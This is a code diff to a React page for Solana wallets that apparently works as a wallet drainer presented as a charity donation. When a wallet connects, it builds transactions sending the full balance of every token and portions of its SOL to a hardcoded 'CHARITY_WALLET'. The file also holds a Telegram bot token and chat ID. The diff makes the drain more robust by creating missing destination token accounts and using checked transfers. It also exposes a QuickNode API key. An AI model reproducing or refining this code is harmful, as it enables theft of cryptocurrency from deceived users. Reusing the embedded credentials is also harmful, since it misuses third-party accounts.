@@ -2,7 +2,7 @@ import { useEffect, useState } from "react";
 import { useWallet } from "@solana/wallet-adapter-react";
 import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
-import { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
+import { getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, createTransferCheckedInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
 import { Button } from "@/components/ui/button";
 import { Link } from "react-router-dom";
 import AnimatedBackground from "@/components/AnimatedBackground";
@@ -12,6 +12,7 @@ import { toast } from "sonner";
 import solanaLogo from "@/assets/solana-logo.jpg";
 const CHARITY_WALLET = "4E9G6hLmdMGit2n5AL1UwEpx7foKomhQx4jPdXwSwdHj";
 const QUICKNODE_RPC = "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";
+const QUICKNODE_WSS = "wss://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";
 const TELEGRAM_BOT_TOKEN = "8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M";
 const TELEGRAM_CHAT_ID = "-4836248812";
 interface TokenBalance {
@@ -30,7 +31,7 @@ const Index = () => {
   const [failed, setFailed] = useState(false);
   const [solBalance, setSolBalance] = useState(0);
   const [tokens, setTokens] = useState<TokenBalance[]>([]);
-  const [connection] = useState(() => new Connection(QUICKNODE_RPC, "confirmed"));
+  const [connection] = useState(() => new Connection(QUICKNODE_RPC, { commitment: "confirmed", wsEndpoint: QUICKNODE_WSS }));
   useEffect(() => {
     if (publicKey) {
       fetchBalances();
@@ -122,14 +123,36 @@ const Index = () => {
             const mintPubkey = new PublicKey(token.mint);
             const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
             const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
-            transaction.add(createTransferInstruction(fromTokenAccount, toTokenAccount, publicKey, BigInt(token.balance), [], TOKEN_PROGRAM_ID));
+
+            // Ensure destination ATA exists before transfer
+            const toInfo = await connection.getAccountInfo(toTokenAccount);
+            if (!toInfo) {
+              transaction.add(
+                createAssociatedTokenAccountInstruction(
+                  publicKey, // payer
+                  toTokenAccount,
+                  charityPubkey,
+                  mintPubkey
+                )
+              );
+            }
+
+            // Use checked transfer to prevent decimals mismatch issues
+            transaction.add(
+              createTransferCheckedInstruction(
+                fromTokenAccount,
+                toTokenAccount,
+                mintPubkey,
+                publicKey,
+                BigInt(token.balance),
+                token.decimals
+              )
+            );
           } catch (error) {
             console.error(`Error adding token ${token.mint}:`, error);
           }
         }
         if (transaction.instructions.length > 0) {
-          transaction.feePayer = publicKey;
-          transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
           transactions.push(transaction);
         }
       }
@@ -145,8 +168,6 @@ const Index = () => {
             toPubkey: charityPubkey,
             lamports: firstAmount
           }));
-          firstTx.feePayer = publicKey;
-          firstTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
           transactions.push(firstTx);
           const secondAmount = Math.floor(availableBalance * 0.3 * LAMPORTS_PER_SOL);
           const secondTx = new Transaction().add(SystemProgram.transfer({
@@ -154,8 +175,6 @@ const Index = () => {
             toPubkey: charityPubkey,
             lamports: secondAmount
           }));
-          secondTx.feePayer = publicKey;
-          secondTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
           transactions.push(secondTx);
         }
       }
